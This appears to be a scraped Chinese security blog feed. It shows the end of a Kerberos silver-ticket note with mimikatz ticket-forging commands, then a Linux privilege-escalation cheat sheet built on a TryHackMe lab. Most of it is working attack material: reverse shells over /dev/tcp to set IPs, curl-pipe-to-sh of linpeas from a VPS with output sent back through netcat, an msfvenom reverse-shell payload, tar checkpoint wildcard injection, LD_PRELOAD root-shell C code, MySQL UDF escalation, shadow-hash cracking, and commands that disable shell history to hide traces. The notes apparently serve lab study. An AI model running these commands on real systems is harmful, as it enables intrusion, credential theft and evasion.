class="hljs axapta"><br><span class="hljs-meta">## 银票据</span><br><br>伪造的ST<br><br>在kerberos第三步的时候，Server接收到<span class="hljs-keyword">client</span>的请求之后，通过自己的Master Key解密ST，从而获得Session Key。<br><br>通过session key解密Authenticator3 进而验证对方的身份，验证成功就让<span class="hljs-keyword">client</span>访问指定服务了。<br><br>特点<br><br>- 不需要与KDC进行交互<br>- 需要<span class="hljs-keyword">server</span>的NTLM hash<br><br>同黄金票据流程<br><br>登录上面创建的域管用户，用管理员权限打开CMD，cd 到 mimikatz 存放的目录，去执行mimikatz的命令，得到SID和NTLM<br><br></code></pre></td></tr></table></figure><p>mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords” “exit”&gt;log.txt</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs"><br>先使用mimikatz清空票据，再导入伪造的票据,具体伪造票据的<br><br></code></pre></td></tr></table></figure><p>kerberos::golden &#x2F;domain:cyberpeace.com &#x2F;sid:S-1-5-21-2718660907-658632824-2072795563 &#x2F;target:scene.cyberpeace.com &#x2F;service:cifs &#x2F;rc4:9a68826fdc2811f20d1f73a471ad7b9a &#x2F;user:test &#x2F;ptt</p><pre><code class="hljs">## 金票与银票的区别- 获取的权限不同  - 金票：伪造的TGT，可以获取任意Kerberos的访问权限  - 银票：伪造的ST，只能访问指定的服务，如CIFS- 认证流程不同  - 金票：同KDC交互，但不同AS交互  - 银票：不同KDC交互，直接访问Server- 加密方式不同  - 金票：由krbtgt NTLM Hash加密  - 银票：由服务账号 NTLM Hash加密</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权总结</title>
    <link href="/2024/10/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <url>/2024/10/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a><a href="">Linux提权</a></h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>什么是提权？<ul><li>指在渗透测试或者红队行动中，取得低权限用户之后，提升至更高权限用户，直至获得root权限用户的过程。</li></ul></li><li>提权的需求<ul><li>重置密码</li><li>绕过访问控制以提取受保护的数据</li><li>编辑软件配置</li><li>开启持久化，以便稍后再次访问该计算机</li><li>更改现有或者新用户的权限</li><li>获取root flag</li><li>执行任何管理命令</li></ul></li><li>提权的原理<ul><li>低权限可修改的可执行文件或者脚本，能够以高权限运行。</li><li>从用户行为角度，用低权限用户的运维人员，也需要记忆、输入、备份凭据，以备使用高权限用户完成操作</li><li>在权限的上层，捕捉、拦截、修改凭据信息或者权限信息，如一些基于内存读取操作实现的内核利用。</li></ul></li></ul><h2 id="Linux提权枚举"><a href="#Linux提权枚举" class="headerlink" title="Linux提权枚举"></a>Linux提权枚举</h2><ul><li><p>获取访问权限后，不论是什么权限的用户，第一步都是进行枚举，进行信息搜集。</p></li><li><p>终端升级</p><ul><li>将shell升级为完整的tty（交互式shell）</li></ul></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br>python2 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br>CTRL + Z<br>stty<span class="hljs-built_in"> raw </span>-echo<br>fg<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">TERM</span>=xterm-color<br></code></pre></td></tr></table></figure><ul><li>还可以用</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-string">`rlwrap nc -lvnp &lt;port&gt;`</span><br></code></pre></td></tr></table></figure><ul><li>设置不记录历史命令</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; <span class="hljs-built_in">export</span><br><span class="hljs-attribute">HISTFILE</span>=/dev/null; <span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTSIZE</span>=0; <span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTFILESIZE</span>=0<br></code></pre></td></tr></table></figure><h3 id="手工枚举"><a href="#手工枚举" class="headerlink" title="手工枚举"></a>手工枚举</h3><ul><li><p>id 用于显示当前用户的ID、组ID、以及所属的其他组信息。另外id命令可以用于获取另一个用户的相同信息。</p></li><li><p>who 显示当前登陆的用户以及相关信息，登陆时间、终端等。</p></li><li><p>whoami 显示用户名</p></li><li><p>w 提供当前登录用户的详细信息，包括他们在做什么以及系统的负载信息。</p></li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241013181706218.png" alt="image-20241013181706218"></p><ul><li><p>last 显示系统最近的登录记录</p><ul><li>lastlog显示的信息少一点，没有ip等信息</li></ul></li><li><p>uname -a</p><ul><li>显示系统相关信息</li></ul></li><li><p>lsb_release -a</p><ul><li>用于显示Linux标准基础的发行信息</li></ul></li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241013182007376.png" alt="image-20241013182007376"></p><ul><li><p>cat &#x2F;proc&#x2F;version</p><ul><li>显示内核版本和编译信息</li><li>要差看是否安装了GCC就可以⽤这条命令。</li></ul></li><li><p>cat &#x2F;etc&#x2F;issue 查看系统的发行版本信息</p></li><li><p>cat &#x2F;etc&#x2F;*-release</p><ul><li>查看系统发⾏版的详细信息</li><li>会搜索&#x2F;etc&#x2F;目录下所有以-release结尾的文件，并显示内容。</li></ul></li><li><p>ip addr</p><ul><li>也可以写作ip a 旧版命令ifconfig，这些命令提供有关网卡、网络配置的信息。</li><li>多张网卡配合路由信息可以发现内网网段</li></ul></li><li><p>ip route </p><ul><li>用于查询路由表，route是过时的命令</li></ul></li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241013182630728.png" alt="image-20241013182630728"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">default</span> via <span class="hljs-number">192.168.13.2</span> dev eth0 proto dhcp src <span class="hljs-number">192.168.13.128</span> metric <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><ul><li>default 表示默认路由 当系统无法找到路由的时候，就走默认路由</li><li>via 192.168.13.2 指定通过ip为192.168.13.2的网关进行路由</li><li>dev eth0 表示使用eth0接口发送流量</li><li>proto dhcp 表示路由是通过DHCP自动配置的</li><li>src <strong>192.168.13.128</strong>：这是源地址</li><li>metric 100 这是路由的优先级别 数值越小其优先级别越高</li></ul><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.17.0.0</span>/<span class="hljs-number">16</span> dev docker0 proto kernel scope link src <span class="hljs-number">172</span>.<span class="hljs-number">17</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> linkdown<br></code></pre></td></tr></table></figure><ul><li><p>172.17.0.0&#x2F;16 是一个Docker虚拟网络，指定了一个子网</p></li><li><p>dev docker0 表示流量通过docker0接口</p></li><li><p>proto kernel 表示该路由是由内核自动创建的</p></li><li><p>scope link 表示该路由直达 也就是不需要中转 网关</p></li><li><p>linkdown 表示该接口当前属于关闭状态</p></li><li><p>ip neigh</p><ul><li><p>用于查询邻居表</p></li><li><p>会包括 邻居ip地址 mac地址 通过什么接口连接 是否可达</p></li></ul></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">13</span>.<span class="hljs-number">1</span> dev eth0 lladdr <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:c0:<span class="hljs-number">00</span>:<span class="hljs-number">08</span> REACHABLE <br></code></pre></td></tr></table></figure><ul><li><p><strong>REACHABLE</strong>：表示该邻居是可达的</p></li><li><p><strong>STALE</strong>：表示该邻居的状态为陈旧，意味着在最近一段时间没有与之通信，可能需要重新确认其可达性。</p></li><li><p>arp -a</p><ul><li>用于显示arp缓存，有人用来当做内网主机发现</li></ul></li><li><p>hostname</p><ul><li>返回目标机器的主机名</li><li>有些情况下可以提供有关⽬标系统在网络中的角色的信息（例如，表示⽣ 产SQL服务器的SQL-Accounts-01）。</li></ul></li><li><p>sudo -l </p><ul><li>列出允许用户以root权限运行某些（或全部）命令</li></ul></li><li><p>capabilities</p><ul><li>检测capabilities</li><li>关于Linux capabilities ，它为进程提供了⼀部分可⽤的 root 权限子集。有效地将 root 权限划分成较小 且独特的单元。然后，可以独立地将这些单元授予进程。这样，权限集合就会减少，降低了被利用的风 险。</li></ul></li><li><p>ls -a</p><ul><li>可以用ls -liah列出详细隐藏内容</li></ul></li><li><p>history 查看早期命令</p><ul><li>cat ~&#x2F;.bash_history</li></ul></li><li><p>&#x2F;etc&#x2F;passwd 发现系统上用户的简单方法</p><ul><li>这会返回所有用户，其中一些是系统或者服务用户，可能没啥用。</li><li>cat &#x2F;etc&#x2F;passwd | grep home 一般真实用户会在home目录下有自己的文件夹</li></ul></li><li><p>cat &#x2F;etc&#x2F;crontab</p><ul><li>查看计划任务</li></ul></li><li><p>echo $PATH</p><ul><li>用命令env显示环境变量 内容更多</li></ul></li><li><p>ps -ef</p><ul><li>PID 表示进程ID</li><li>TTY 终端类型</li><li>Time 进程使用的CPU时间</li><li>CMD 正在运行的命令或者可执行文件</li><li>ps -A或者-e 查看所有运行进程</li><li>ps axjf 查看进程树</li><li>ps aux<ul><li>a：显示所有用户的进程</li><li>u显示启动进程的用户</li><li>x：显示未连接到终端的进程（后台进程或者守护进程）</li></ul></li></ul></li><li><p>top -n 1</p><ul><li>监控系统新能</li><li>-n 1表示不迭代直接退出</li></ul></li><li><p>netstat</p><ul><li>-a：显示所有正在监听的端口和已经建立的连接</li><li>-at或者-au：用于分别列出TPC和UDP协议</li><li>-l：列出处于监听模式的端口。这些端口是打开的，并准备接收传入的连接。可以和-t一起用，列出tcp协议监听的端口</li><li>-s 按照协议列出</li><li>-tp：列出服务名称和PID信息的连接</li><li>-i：显示接口信息</li><li>-ano ；a显示所有套接字，n不解析名称，o显示计时器</li></ul></li><li><p>find命令</p><ul><li>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null：查找设置了SUID位的文件，可以根据这个提权。<ul><li><code>-perm</code> 选项用于指定搜索文件的权限</li><li><code>-u=s</code> 表示查找所有设置了 <strong>SUID</strong> 位的文件</li><li><code>-type f</code> 用于指定只查找文件</li><li><code>2&gt;/dev/null</code> 将所有错误输出（文件描述符2代表标准错误输出，即stderr）重定向到 <code>/dev/null</code>，相当于丢弃它们</li></ul></li></ul></li><li><p>which</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">which awk <span class="hljs-keyword">perl</span> <span class="hljs-keyword">python</span> <span class="hljs-keyword">ruby</span> gcc <span class="hljs-keyword">cc</span> <span class="hljs-keyword">vi</span> <span class="hljs-keyword">vim</span> <span class="hljs-keyword">nmap</span> <span class="hljs-keyword">find</span> netcat nc wget tftp ftp tmux screen <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure><ul><li><p>locate 使用本地数据库快速查找文件位置，但是不是实时更新的，可以用命令updatedb更新</p></li><li><p>&#x2F;etc&#x2F;fstab </p><ul><li>检测未挂载的文件系统</li></ul></li></ul><h3 id="自动化枚举"><a href="#自动化枚举" class="headerlink" title="自动化枚举"></a>自动化枚举</h3><ul><li><p>优点：省时省力</p></li><li><p>缺点：产生流量和特征，结果冗长，读懂需要时间，很难特定性扫描，容易遗漏，看似很全。</p></li><li><p>常用工具</p><ul><li>linpes<ul><li><a href="https://github.com/peass-ng/PEASS-ng/releases/download/20241011-2e37ba11/linpeas.sh">https://github.com/peass-ng/PEASS-ng/releases/download/20241011-2e37ba11/linpeas.sh</a></li><li>实时更新，极其常用</li></ul></li><li>linEnum<ul><li><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li><li>较老</li></ul></li><li>linux-exploit-suggester<ul><li><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></li><li>常用</li></ul></li><li><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a><ul><li>py环境</li></ul></li><li><a href="https://github.com/pentestmonkey/unix-privesc-check">https://github.com/pentestmonkey/unix-privesc-check</a></li></ul></li><li><p>目标系统的环境将影响我们要使用的工具，例如python，如果系统针对某些函数、关键字做了屏蔽，就需要多尝试几个工具，因此需要熟悉多个工具。</p></li><li><p>LinPEAS最佳实践</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -L https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/peass-ng/</span>PEASS-ng<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/20241011-2e37ba11/</span>linpeas.sh | sh  &gt;&gt; lin.txt<br></code></pre></td></tr></table></figure><ul><li><p>-L表示跟随重定向</p></li><li><p>实战中基本不能访问到github 注意把脚本放到自己vps上</p></li><li><p>从内存中执行，结果返回kali</p><ul><li>nc -lvnp 81 | tee linpeas.out #kali</li><li>curl 47.236.228.126:3334&#x2F;linpeas.sh | sh | nc 47.236.228.126 81</li></ul></li><li><p>没有curl的情况</p><ul><li><p>sudo nc -q 5 -lvnp 81 &lt; linpeas.sh #kali</p><ul><li>如果nc版本不支持-q循环，使用下面命令代替</li></ul></li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span> nc -lvnp 81 &lt; linpeas.sh; <span class="hljs-built_in">sleep</span> 5; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">  - cat &lt; /dev/tcp/47.236.228.126/81 | sh</code></pre><ul><li><p>less -r &#x2F;path&#x2F;to</p><ul><li>读取分色文件内容</li></ul></li><li><p>支持openssl和base64加密传输</p></li></ul><h2 id="提权实例"><a href="#提权实例" class="headerlink" title="提权实例"></a>提权实例</h2><h3 id="MySQL-UDF提权"><a href="#MySQL-UDF提权" class="headerlink" title="MySQL-UDF提权"></a>MySQL-UDF提权</h3><ul><li><p>靶机名称： <a href="https://tryhackme.com/room/linuxprivesc">https://tryhackme.com/room/linuxprivesc</a></p></li><li><p>立足点凭据：user:password321</p></li><li><p>udf是“User-Defined Function”的缩写，即用户自定义函数的缩写。这是MySQL自带的一个功能，这些函数可以在SQL查询的时候用到，类似于内置函数。</p></li><li><p>提权条件</p><ul><li><p>有一个mysql数据库账户，该账户有create、insert、delete权限。</p></li><li><p>secure_file_priv为空：使用 show variables like ‘&amp;secure_file_priv’; 来查看</p><ul><li>这是一个MySQL的系统变量，用来限制LOAD DATA, SELECT … INTO OUTFILE 、LOAD_FILE()  等文件操作的范围。</li><li>非空代表无限制</li><li>NULL代表完全限制</li><li>特定目录代表该目录可操作</li></ul></li><li><p>准备利用文件</p></li></ul></li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241014153654675.png" alt="image-20241014153654675"></p><pre><code class="hljs">- 发现版本 5.1.73- kali使用searchsploit udf寻找相关文件- 注意：先使用show variables like &#39;%secure_file_priv%&#39;;查看值</code></pre><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gcc -<span class="hljs-selector-tag">g</span> -fPIC -c raptor_udf2<span class="hljs-selector-class">.c</span><br>gcc -<span class="hljs-selector-tag">g</span> -shared -Wl,-soname,raptor_udf2<span class="hljs-selector-class">.so</span> -o raptor_udf2<span class="hljs-selector-class">.so</span> raptor_udf2<span class="hljs-selector-class">.o</span> -lc<br></code></pre></td></tr></table></figure><pre><code class="hljs">- -fPIC 表示生成位置无关代码 适合创建共享库- SHOW VARIABLES LIKE &#39;plugin_dir&#39;; 查找到目录修改下面代码中的路径</code></pre><ul><li>利用过程</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">use mysql;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> foo(<span class="hljs-type">line</span> blob);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> foo <span class="hljs-keyword">values</span>(load_file(<span class="hljs-string">&#x27;/home/user/tools/mysql-udf/raptor_udf2.so&#x27;</span>));<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> foo <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> do_system <span class="hljs-keyword">returns</span> <span class="hljs-type">integer</span> soname <span class="hljs-string">&#x27;raptor_udf2.so&#x27;</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func;<br></code></pre></td></tr></table></figure><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241014161032147.png" alt="image-20241014161032147"></p><ul><li><p>如果dumpfile失败，对于 AppArmor（如果您使⽤的是基于 Debian 的系统，如 Ubuntu），编辑&#x2F;etc&#x2F;apparmor.d&#x2F;usr.sbin.mysqld 文件，找到以下行： &#x2F;usr&#x2F;sbin&#x2F;mysqld { ，在此行下方添加以下内容： &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;** rw</p></li><li><p>删除mysql函数的命令：DROP FUNCTION IF EXISTS do_system;</p></li><li><p>查询已有udf：SELECT * FROM mysql.func;</p></li><li><p>执行udf：select do_system(‘cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;rootbash; chmod +xs &#x2F;tmp&#x2F;rootbash’);</p></li><li><p>提权：&#x2F;tmp&#x2F;rootbash -p</p></li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241014161244516.png" alt="image-20241014161244516"></p><ul><li><p>提权原理</p><ul><li>在udf文件中自定义一些能够以高权限执行系统命令的函数，然后将该函数导入mysql数据库中，通过mysql数据库以高权限执行系统命令，获得root权限。</li></ul></li></ul><h3 id="可读shadow文件提权"><a href="#可读shadow文件提权" class="headerlink" title="可读shadow文件提权"></a>可读shadow文件提权</h3><ul><li>ls -la &#x2F;etc&#x2F;shadow 3个r表示全部可读</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow | grep <span class="hljs-string">&#x27;:\$&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>搜索结果放到hash文件里</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">john <span class="hljs-built_in">hash</span> --wordlist=<span class="hljs-regexp">/usr/</span>share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241014163305201.png" alt="image-20241014163305201"></p><h3 id="可写shadow提权"><a href="#可写shadow提权" class="headerlink" title="可写shadow提权"></a>可写shadow提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /etc/shadow /tmp/shadow.bak<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mkpasswd</span> -m sha-<span class="hljs-number">512</span> dawn<br></code></pre></td></tr></table></figure><ul><li>vim修改 或者sed修改</li></ul><h3 id="可写passwd文件提权"><a href="#可写passwd文件提权" class="headerlink" title="可写passwd文件提权"></a>可写passwd文件提权</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">openssl passwd RedteamNotes</span><br></code></pre></td></tr></table></figure><ul><li>替换x即可</li></ul><h3 id="sudo环境变量提权"><a href="#sudo环境变量提权" class="headerlink" title="sudo环境变量提权"></a>sudo环境变量提权</h3><ul><li><p>sudo -l</p></li><li><p>在某些系统上，可能会看到LD_PRELOAD环境选项</p></li><li><p>LD_PRELOAD是允许任何程序使用共享库的功能。如果启用了“env_keep”选项，我们可以生成一个共享库，该共享库将在运行程序之前加载和执行。</p></li><li><p>如果真实用户id与有效用户id不通，则将忽视LD_PRELOAD选项</p></li><li><p>步骤</p><ul><li>检查 LD_PRELOAD（带有 env_keep 选项）</li></ul></li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241014164305801.png" alt="image-20241014164305801"></p><ul><li><p>编写⼀个简单的 C 代码作为共享对象（.so 扩展名）文件编译</p></li><li><p>使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序</p></li><li><p>具体过程</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> _init() &#123;<br><span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);  <span class="hljs-comment">// 清除 LD_PRELOAD 环境变量</span><br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);                <span class="hljs-comment">// 设置组 ID 为 0（root）</span><br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);                <span class="hljs-comment">// 设置用户 ID 为 0（root）</span><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>);      <span class="hljs-comment">// 启动一个新的 bash shell</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>将以上代码保存为shell.c</p></li><li><p>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</p></li><li><p>然后使用能够sudo运行的程序去运行他</p></li><li><p>sudo LD_PRELOAD&#x3D;&#x2F;home&#x2F;user&#x2F;shell.so find</p><ul><li>指定find</li></ul></li><li><p>LD代表动态链接器，是操作系统中的一个组件，负责在程序运行时链接共享库到程序中。</p></li><li><p>这些共享库（例如.so文件，即shared objects）包含程序运行所需要的函数和资源</p></li><li><p>PRELOAD代表预加载。意味着在程序运行之前，动态链接器会先加载由LD_PRELOAD环境变量指定的共享库，这使得用户可以再正常的库加载顺序之优先加载自定义的共享库。</p></li></ul><h3 id="计划任务文件提权"><a href="#计划任务文件提权" class="headerlink" title="计划任务文件提权"></a>计划任务文件提权</h3><ul><li>cat &#x2F;etc&#x2F;crontab</li><li>locate overwrite.sh</li><li>ls -liah &#x2F;usr&#x2F;local&#x2F;bin&#x2F;overwrite.sh</li><li>vim &#x2F;usr&#x2F;local&#x2F;bin&#x2F;overwrite.sh<ul><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.13.128&#x2F;4444 0&gt;&amp;1</li></ul></li><li>等待执行即可</li></ul><h3 id="计划任务PATH环境变量提权"><a href="#计划任务PATH环境变量提权" class="headerlink" title="计划任务PATH环境变量提权"></a>计划任务PATH环境变量提权</h3><ul><li><p>cat &#x2F;etc&#x2F;crontab</p></li><li><p>原理是有一些计划任务不是绝对路径 是相对路径 而系统PATH有很多，也就是说有前后之分，优先级之分</p></li><li><p>如果我们在优先级高的path上能新建一个同名的 就可以用原本计划任务的权限去执行我们想执行的代码</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">cp</span> /bin/bash /tmp/rootbash<br><span class="hljs-built_in">chmod</span> +xs /tmp/rootbash<br></code></pre></td></tr></table></figure><ul><li>chmod +xs 你新建的这个.sh文件</li></ul><h3 id="自动任务通配符提权"><a href="#自动任务通配符提权" class="headerlink" title="自动任务通配符提权"></a>自动任务通配符提权</h3><ul><li><p>cat &#x2F;etc&#x2F;crontab</p></li><li><p>cat &#x2F;usr&#x2F;local&#x2F;bin&#x2F;compress.sh</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">cd</span> /home/user<br>tar czf /tmp/backup.tar.gz *<br></code></pre></td></tr></table></figure><ul><li><p>发现有tar这个文件出现</p></li><li><p>tar –help | grep checkpoint</p></li></ul><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">--checkpoint[=NUMBER]  display progress messages every NUMBERth record<br>--checkpoint-action=ACTION  <span class="hljs-built_in"> execute </span>ACTION on each checkpoint<br></code></pre></td></tr></table></figure><ul><li>上面的功能 有一个检查点设置 tar会执行这个检查点</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.17.6.156 <span class="hljs-attribute">LPORT</span>=4444 -f elf -o shell.elf<br></code></pre></td></tr></table></figure><ul><li><p>chmod +xs shell.elf</p></li><li><p>生成一个反弹shell的木马</p></li><li><p>touch &#x2F;home&#x2F;user&#x2F;–checkpoint&#x3D;1</p></li><li><p>touch &#x2F;home&#x2F;user&#x2F;–checkpoint-action&#x3D;exec&#x3D;a.sh</p></li><li><p>有点抽象 复现了半天 结果发现是kali的4444端口有问题 换成3334就行了</p></li><li><p>另外a.sh直接写一个替代的bash命令 起到的效果是一样的</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>bash -i &gt;&amp; /dev/tcp/10.17.6.156/3334 0&gt;&amp;1<br></code></pre></td></tr></table></figure><h3 id="SUID可执行文件已知利用提权"><a href="#SUID可执行文件已知利用提权" class="headerlink" title="SUID可执行文件已知利用提权"></a>SUID可执行文件已知利用提权</h3><ul><li>利用过程<ul><li>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</li><li>在kali中 <ul><li>searchsploit exim 4.84</li><li>searchsploit exim -m 39535</li><li>locate 拿到具体位置</li><li>cp 具体位置 . 复制到当前目录</li><li>py3开个http服务</li></ul></li><li>wget过去加权限执行即可</li><li>思路自己拓展 应该不止exim能用 很多都有提权漏洞 具体结合谷歌或者searsploit尝试</li></ul></li></ul><h3 id="SUID共享库"><a href="#SUID共享库" class="headerlink" title="SUID共享库"></a>SUID共享库</h3><ul><li><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p></li><li><p>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-so</p></li><li><p>看样子像一个共享库之类的文件 </p></li><li><p>执行看看是啥样的</p></li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241015165940461.png" alt="image-20241015165940461"></p><ul><li>strings看一下内容</li></ul><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241015170039282.png" alt="image-20241015170039282"></p><ul><li><p>发现了一个在我们当前目录下的一个.so文件</p></li><li><p>strace &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-so 2&gt;&amp;1 | grep ‘&#x2F;home&#x2F;user’</p><ul><li>追踪运行看看</li></ul></li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">user@debian:~$ strace <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>suid-so <span class="hljs-number">2</span>&gt;&amp;<span 